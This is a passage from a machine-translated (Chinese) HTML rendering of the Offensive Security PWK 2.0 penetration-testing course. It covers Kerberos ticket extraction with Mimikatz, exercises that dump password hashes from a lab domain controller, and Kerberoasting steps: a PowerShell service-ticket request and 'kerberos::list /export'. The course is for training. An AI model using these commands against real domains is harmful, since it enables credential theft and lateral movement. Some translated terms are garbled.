<div style="position:absolute;top:38388;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务名称 (02) : cifs ; </font><font style="vertical-align: inherit;">dc01 ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38404;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标名称 (02) : cifs ; </font><font style="vertical-align: inherit;">dc01 ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38421;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端名称 (01) : Offsec ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38438;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 40a50000 : name_canonicalize ; </font><font style="vertical-align: inherit;">ok_as_delegate ; </font><font style="vertical-align: inherit;">预认证；</font><font style="vertical-align: inherit;">可再生 ;</font></font></nobr></div>
<div style="position:absolute;top:38455;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥：0x00000012 - aes256_hmac</font></font></nobr></div>
<div style="position:absolute;top:38472;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718</font></font></nobr></div>
<div style="position:absolute;top:38489;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票    </font></font></nobr></div>
<div style="position:absolute;top:38489;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：0x00000012-aes256_hmac；</font><font style="vertical-align: inherit;">kvno = 3    </font></font></nobr></div>
<div style="position:absolute;top:38489;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[...]</font></font></nobr></div>
<div style="position:absolute;top:38523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 组 - 客户票？</font></font></nobr></div>
<div style="position:absolute;top:38557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 2 组 -</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证授予票证</font></font></font></b></nobr></div>
<div style="position:absolute;top:38574;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000000]</font></font></nobr></div>
<div style="position:absolute;top:38591;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew: 09/02/2018 14.41.47 ; </font><font style="vertical-align: inherit;">10/02/2018 00.41.47 ; </font><font style="vertical-align: inherit;">16/02/2018 14.41.47</font></font></nobr></div>
<div style="position:absolute;top:38608;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务名称 (02) : krbtgt ; </font><font style="vertical-align: inherit;">CORP.COM ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38625;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标名称 (--) : @ CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38642;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端名称 (01) : Offsec ; </font><font style="vertical-align: inherit;">@ CORP.COM ($$Delegation Ticket$$)</font></font></nobr></div>
<div style="position:absolute;top:38659;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 60a10000 : name_canonicalize ; </font><font style="vertical-align: inherit;">预认证；</font><font style="vertical-align: inherit;">可再生 ; </font><font style="vertical-align: inherit;">转发；</font><font style="vertical-align: inherit;">福尔瓦</font></font></nobr></div>
<div style="position:absolute;top:38676;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥：0x00000012 - aes256_hmac</font></font></nobr></div>
<div style="position:absolute;top:38693;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3b0a49af17a1ada1dacf2e3b8964ad397d80270b71718cc567da4d4b2b6dc90d</font></font></nobr></div>
<div style="position:absolute;top:38710;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票    </font></font></nobr></div>
<div style="position:absolute;top:38710;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：0x00000012-aes256_hmac；</font><font style="vertical-align: inherit;">kvno = 2    </font></font></nobr></div>
<div style="position:absolute;top:38710;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[...]</font></font></nobr></div>
<div style="position:absolute;top:38727;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000001]</font></font></nobr></div>
<div style="position:absolute;top:38744;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew: 09/02/2018 14.41.47 ; </font><font style="vertical-align: inherit;">10/02/2018 00.41.47 ; </font><font style="vertical-align: inherit;">16/02/2018 14.41.47</font></font></nobr></div>
<div style="position:absolute;top:38761;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务名称 (02) : krbtgt ; </font><font style="vertical-align: inherit;">CORP.COM ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38778;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标名称 (02) : krbtgt ; </font><font style="vertical-align: inherit;">CORP.COM ; </font><font style="vertical-align: inherit;">@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38795;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端名称 (01) : Offsec ; </font><font style="vertical-align: inherit;">@ CORP.COM ( CORP.COM )</font></font></nobr></div>
<div style="position:absolute;top:38812;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 40e10000 : name_canonicalize ; </font><font style="vertical-align: inherit;">预认证；</font><font style="vertical-align: inherit;">最初的 ; </font><font style="vertical-align: inherit;">可再生 ; </font><font style="vertical-align: inherit;">向前</font></font></nobr></div>
<div style="position:absolute;top:38829;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥：0x00000012 - aes256_hmac</font></font></nobr></div>
<div style="position:absolute;top:38845;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f5691a749c</font></font></nobr></div>
<div style="position:absolute;top:38862;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票    </font></font></nobr></div>
<div style="position:absolute;top:38862;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：0x00000012-aes256_hmac；</font><font style="vertical-align: inherit;">kvno = 2    </font></font></nobr></div>
<div style="position:absolute;top:38862;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[...]</font></font></nobr></div>
<div style="position:absolute;top:38880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:38899;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 690 - 使用 mimikatz 提取 Kerberos 票证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出同时显示了 TGT 和 TGS。</font><font style="vertical-align: inherit;">窃取 TGS 将允许我们仅访问特定的</font></font></nobr></div>
<div style="position:absolute;top:38948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与这些票证关联的资源。</font><font style="vertical-align: inherit;">在另一边，拿着 TGT 票，我们可以</font></font></nobr></div>
<div style="position:absolute;top:38967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们想要在域内定位的特定资源请求 TGS。</font><font style="vertical-align: inherit;">我们将讨论如何</font></font></nobr></div>
<div style="position:absolute;top:38987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">稍后在模块中利用被盗或伪造的门票。</font></font></nobr></div>
<div style="position:absolute;top:39019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了这些功能，Mimikatz还可以将门票导出到硬盘，导入门票</font></font></nobr></div>
<div style="position:absolute;top:39038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入 LSASS，我们将在后面探讨。</font><font style="vertical-align: inherit;">Mimikatz 甚至可以提取与</font></font></nobr></div>
<div style="position:absolute;top:39058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过智能卡和 PIN 执行身份验证，使该工具成为真正的缓存凭据</font></font></nobr></div>
<div style="position:absolute;top:39077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“瑞士军刀”！</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:39112;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Mimikatz 从学生 VM 转储所有密码哈希。</font></font></nobr></div>
<div style="position:absolute;top:39170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.通过远程桌面以Jeff_Admin账号登录域控制器，使用</font></font></nobr></div>
<div style="position:absolute;top:39189;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mimikatz 从服务器转储所有密码哈希。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">651</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:39508;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.4</font></font></i></nobr></div>
<div style="position:absolute;top:39508;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务帐户攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回顾 Kerberos 协议的解释，我们知道当用户想要访问一个</font></font></nobr></div>
<div style="position:absolute;top:39565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 SPN 托管的资源，客户端请求由域生成的服务票证</font></font></nobr></div>
<div style="position:absolute;top:39584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font><font style="vertical-align: inherit;">然后服务票证由应用程序服务器解密和验证，因为它是</font></font></nobr></div>
<div style="position:absolute;top:39604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 SPN 的密码哈希加密。</font></font></nobr></div>
<div style="position:absolute;top:39637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从域控制器请求服务票证时，不执行任何检查</font></font></nobr></div>
<div style="position:absolute;top:39656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户是否有任何权限访问由服务主体名称托管的服务。</font></font></nobr></div>
<div style="position:absolute;top:39675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些检查仅在连接到服务本身时作为第二步执行。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:39695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着如果我们知道我们想要定位的 SPN，我们可以从</font></font></nobr></div>
<div style="position:absolute;top:39714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器。</font><font style="vertical-align: inherit;">那么，既然是我们自己的票，我们就可以从本地内存中提取出来保存</font></font></nobr></div>
<div style="position:absolute;top:39734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到磁盘。</font></font></nobr></div>
<div style="position:absolute;top:39766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本节我们将滥用服务票据，尝试破解服务密码</font></font></nobr></div>
<div style="position:absolute;top:39786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户。</font></font></nobr></div>
<div style="position:absolute;top:39818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们知道 Internet Information Services Web 服务器的注册 SPN</font></font></nobr></div>
<div style="position:absolute;top:39838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/CorpWebServer.corp.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在 PowerShell 中，我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:39857;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerberosRequestorSecurityToken</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">655</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以请求服务票证。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">656</font></font></font></nobr></div>
<div style="position:absolute;top:39890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要的代码段位于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.IdentityModel </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">657</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名空间内，这不是</font></font></nobr></div>
<div style="position:absolute;top:39909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下加载到 PowerShell 实例中。</font><font style="vertical-align: inherit;">要加载它，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Add-Type </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">658</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></i></nobr></div>
<div style="position:absolute;top:39929;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序集名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数。</font></font></nobr></div>
<div style="position:absolute;top:39961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">通过指定 SPN</font><font style="vertical-align: inherit;">来调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerberosRequestorSecurityToken</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></i></nobr></div>
<div style="position:absolute;top:39981;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ArgumentList</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，如清单 691 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加类型 -AssemblyName System.IdentityModel</font></font></nobr></div>
<div style="position:absolute;top:40033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新对象 System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H</font></font></nobr></div>
<div style="position:absolute;top:40050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TTP/CorpWebServer.corp.com'</font></font></nobr></div>
<div style="position:absolute;top:40069;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 691 - 请求服务票证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行后，请求的服务票据应由域控制器生成并</font></font></nobr></div>
<div style="position:absolute;top:40118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载到 Windows 10 客户端的内存中。</font><font style="vertical-align: inherit;">我们不是一直执行 Mimikatz，而是</font></font></nobr></div>
<div style="position:absolute;top:40137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以使用内置的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 659</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来显示当前所有缓存的 Kerberos 票证</font></font></nobr></div>
<div style="position:absolute;top:40157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec.CORP&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b></nobr></div>
<div style="position:absolute;top:40225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录 ID 为 0:0x3dedf</font></font></nobr></div>
<div style="position:absolute;top:40259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存门票：（4）</font></font></nobr></div>
<div style="position:absolute;top:40293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#0&gt; 客户：Offsec @ CORP.COM</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:40345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">655 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken(v=vs.110).aspx</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:40379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">656 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（肖恩·梅特卡夫，2016 年），https://adsecurity.org/?p=2293</font></font></font></nobr></div>
<div style="position:absolute;top:40399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">657 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8</font></font></font></nobr></div>
<div style="position:absolute;top:40419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">658 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-6</font></font></font></nobr></div>
<div style="position:absolute;top:40439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">659 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">652</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40696;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：krbtgt/CORP.COM @ CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:40712;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerbTicket 加密类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:40729;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证标志 0x40e10000 -&gt; 可转发可更新初始 pre_authent name_canonica</font></font></nobr></div>
<div style="position:absolute;top:40746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">丽兹</font></font></nobr></div>
<div style="position:absolute;top:40764;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：2/12/2018 10:17:53（本地）</font></font></nobr></div>
<div style="position:absolute;top:40780;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束时间：2/12/2018 20:17:53（本地）</font></font></nobr></div>
<div style="position:absolute;top:40797;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新时间：2/19/2018 10:17:53（本地）</font></font></nobr></div>
<div style="position:absolute;top:40814;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:40831;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存标志：0x1 -&gt; PRIMARY </font></font></nobr></div>
<div style="position:absolute;top:40848;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kdc 调用：DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:40882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#1&gt; 客户：Offsec @ CORP.COM</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:40899;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：HTTP/CorpWebServer.corp.com @ CORP.COM</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40916;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerbTicket 加密类型：RSADSI RC4-HMAC(NT)</font></font></nobr></div>
<div style="position:absolute;top:40933;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证标志 0x40a50000 -&gt; 可转发可更新 pre_authent ok_as_delegate name_c</font></font></nobr></div>
<div style="position:absolute;top:40950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有</font></font></nobr></div>
<div style="position:absolute;top:40967;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：2/12/2018 10:18:31（本地）</font></font></nobr></div>
<div style="position:absolute;top:40984;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束时间：2/12/2018 20:17:53（本地）</font></font></nobr></div>
<div style="position:absolute;top:41001;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新时间：2/19/2018 10:17:53（本地）</font></font></nobr></div>
<div style="position:absolute;top:41018;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥类型：RSADSI RC4-HMAC(NT)</font></font></nobr></div>
<div style="position:absolute;top:41035;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存标志：0 </font></font></nobr></div>
<div style="position:absolute;top:41052;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kdc 调用：DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:41069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:41088;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 692 - 显示票证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Internet Information Services 服务主体名称的服务票证创建并</font></font></nobr></div>
<div style="position:absolute;top:41137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存到内存中（清单 692），我们可以使用内置 API </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">660</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font></nobr></div>
<div style="position:absolute;top:41156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">米卡茨。</font></font></nobr></div>
<div style="position:absolute;top:41189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用 Mimikatz 下载服务票证，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::list</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，它会产生</font></font></nobr></div>
<div style="position:absolute;top:41208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的等效输出</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们还指定了</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/export</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志来下载</font></font></nobr></div>
<div style="position:absolute;top:41228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到磁盘，如清单 693 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::list /export</font></font></font></b></nobr></div>
<div style="position:absolute;top:41297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000000] - 0x00000012 - aes256_hmac</font></font></nobr></div>
<div style="position:absolute;top:41314;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew：12/02/2018 10.17.53 ; </font><font style="vertical-align: inherit;">12/02/2018 20.17.53 ; </font><font style="vertical-align: inherit;">19/02/2018 10.17.53</font></font></nobr></div>
<div style="position:absolute;top:41331;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器名称：krbtgt/CORP.COM@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:41347;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户名称：Offsec@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:41365;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 40e10000 : name_canonicalize ; </font><font style="vertical-align: inherit;">预认证；</font><font style="vertical-align: inherit;">最初的 ; </font><font style="vertical-align: inherit;">可再生 ; </font><font style="vertical-align: inherit;">向前</font></font></nobr></div>
